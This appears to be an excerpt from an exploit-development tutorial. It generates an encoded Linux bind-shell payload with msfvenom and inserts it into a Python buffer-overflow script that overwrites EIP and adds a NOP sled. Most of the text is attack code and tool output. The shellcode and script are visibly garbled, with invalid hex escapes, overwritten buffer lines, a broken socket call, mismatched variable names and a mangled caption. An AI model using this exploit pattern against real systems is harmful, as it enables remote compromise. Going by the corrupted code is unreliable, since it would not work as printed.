http://en.wikooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_bad.

```
root@kali:~# msfvenom -p linux/x86/shell_bind_tcp -b "\x00\x0a\x0d" \
-f python LPORT=8675
No platform was selected, choosing Msf:Module:Platform:Linux from the payload
No Arch selected, assembling Arch: from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
shikata_ga_nai succeeded with size 185 (iteration=0)
x86/shikata_ga_nai chosen with final 185
Payload_size: 185 bytes
buf = "\xd3\xd3\xb61\x63\x6e\x74\xcc\xxd1\x74\x24\x64\x58\x33"
buf = "\xc9\xb1\x14\x31\x68\x19\x83\x68\x19\x83\x00\x04\x81"
buf = "\x45\xxd1\xb5\xf5\x64\xaa\xf8\x63\x6e\xe9a"
buf = "\x9b\xbe\xf0\x80\x3d\x83\x74\xxc2\xb22\x53\xd32"
buf = "\x25\x2d\x33\x61\x67\x79\x7f\x79\x78\x84\x52"
buf = "\x7a\x27\x77\x27\x65\x34\x51\x27\x3a\xxf8\x81"
buf = "\x04\x60\x79\x65\x32\x74\xd6\xb26\xb6\x75\x9c"
buf = "\x11\xf09\xc2\x92\x69\x2e\x99\x80\x65\x15\x5e"
buf = "\x12\--"
root@kali:~#
```

# FIGURE 9 Generating this command is shellcode with metasfven.

Our output from this is the shellcode we need for our Python script. We want to add it into our code where our "xcc" characters currently are, and then we will pad the rest of the string with NOP characters so that we can maintain the length of our exploit string. This will help us later when we want to make this Metasploit module. Our final code should appear like this:

```
#!/usr/bin/python
import socket
s = socket.socket(
host = '127.0.0.1'
port = 8000
ip = "\x30\xcc\xff\xff"
buf = "\a"*268 + eip + "\x90"*32
buf += "\xd3\xd3\xb61\x63\x6e\x74\xcc\xxd1\x74\x24\x64\x58\x33"
buf += "\xc9\xb1\x14\x31\x68\x19\x03\x68\x19\x83\x00\x04\x81"
buf += "\x13\x45\x17\xxb2\x3f\xf5\xe4\x6f\xaa\xf8\x63\x6e\xe9a"
buf += "\x9b\xbe\xf0\x80\x3d\xxd3\x3d\x98\x34\xxc2\x53\xd32"
buf += "\x65\x6b\xxd2\xxd3\x63\x76\x75\x79\x78\x70\x74\x85\x42"
```